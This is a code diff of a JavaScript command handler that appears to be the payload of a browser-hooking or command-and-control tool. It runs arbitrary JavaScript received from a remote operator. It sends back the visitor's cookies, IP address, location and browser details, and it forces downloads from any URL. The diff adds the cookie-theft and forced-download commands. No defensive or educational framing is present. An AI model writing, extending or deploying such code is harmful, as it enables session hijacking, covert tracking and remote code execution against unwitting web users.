@@ -50,67 +50,87 @@ function getIP() {
 }
 
 function exec(command) {
-    command = command.replace("\n","")
-    if (command.replace(" ","") === 'none') {
-        return false;
-    }
-    if (command.startsWith("js: ")) {
-        var javaScript = command.substring("js: ".length,command.length);
-
-        var script = document.createElement("script");
-        script.innerHTML = javaScript;
-        document.body.appendChild(script);
-
-        sendReturn("Run JavaScript ok: "+javaScript)
-        clear_command()
-        return true;
-    }
-    if (command === 'getip') {
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET","https://api.ipify.org/",true)
-        xhr.send();
-        xhr.onload = function (e) {
-            if (xhr.readyState === 4) {
-                if (xhr.status === 200) {
-                    sendReturn( "[IP] "+xhr.responseText);
-                    clear_command()
+    try {
+        command = command.replace("\n","")
+        if (command.replace(" ","") === 'none') {
+            return false;
+        }
+        if (command.startsWith("js: ")) {
+            var javaScript = command.substring("js: ".length,command.length);
+    
+            var script = document.createElement("script");
+            script.innerHTML = javaScript;
+            document.body.appendChild(script);
+    
+            sendReturn("Run JavaScript ok: "+javaScript)
+            clear_command()
+            return true;
+        }
+        if (command === 'get_cookie') {
+            sendReturn(document.cookie);
+            clear_command()
+        }
+        if (command.startsWith('rget ')) {
+            var url = String(command).substring(5 , command.length);
+            var body = document.body;
+            var a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = 'Download'
+            body.appendChild(a);
+            a.click()
+            body.removeChild(a)
+        }
+        if (command === 'get_ip') {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET","https://api.ipify.org/",true)
+            xhr.send();
+            xhr.onload = function (e) {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        sendReturn( "[IP] "+xhr.responseText);
+                        clear_command()
+                    }
+                    else{
+                        sendReturn( "[ ERROR ] GET IP ERROR!" );
+                        clear_command()
+                    }
                 }
-                else{
-                    sendReturn( "[ ERROR ] GET IP ERROR!" );
-                    clear_command()
-                }
-            }
-        };
-        return true;
-    }
-    if (command === 'getlocation')
-    {
-        getLocation();
+            };
+            return true;
+        }
+        if (command === 'getlocation')
+        {
+            getLocation();
+            clear_command()
+            return true;
+        }
+        if (command === 'getinfo') {
+            sendReturn("[ navigator ] /n" +
+                "Platform: "+navigator.platform + "/n" +
+                "UserAgent: " + navigator.userAgent + '/n' +
+                "Language: " + navigator.language + "/n" +
+                "Geolocation: " + navigator.geolocation + '/n' +
+                "OnLine: " + navigator.onLine + "/n" +
+                "AppName: "+navigator.appName + '/n' +
+                "CookieEnabled: " + navigator.cookieEnabled
+            );
+            clear_command()
+            return true;
+        }
+        if (command === 'close') {
+            clearInterval(loop)
+            clear_command()
+            return true;
+        }
+        else {
+            sendReturn("Command Error: "+command);
+            clear_command()
+            return false;
+        }
+    }catch(e) {
+        sendReturn(e)
         clear_command()
-        return true;
-    }
-    if (command === 'getinfo') {
-        sendReturn("[ navigator ] /n" +
-            "Platform: "+navigator.platform + "/n" +
-            "UserAgent: " + navigator.userAgent + '/n' +
-            "Language: " + navigator.language + "/n" +
-            "Geolocation: " + navigator.geolocation + '/n' +
-            "OnLine: " + navigator.onLine + "/n" +
-            "AppName: "+navigator.appName + '/n' +
-            "CookieEnabled: " + navigator.cookieEnabled
-        );
-        clear_command()
-        return true;
-    }
-    if (command === 'close') {
-        clearInterval(loop)
-        clear_command()
-        return true;
-    }
-    else {
-        sendReturn("Command Error: "+command);
-        clear_command()
-        return false;
     }
 }
 
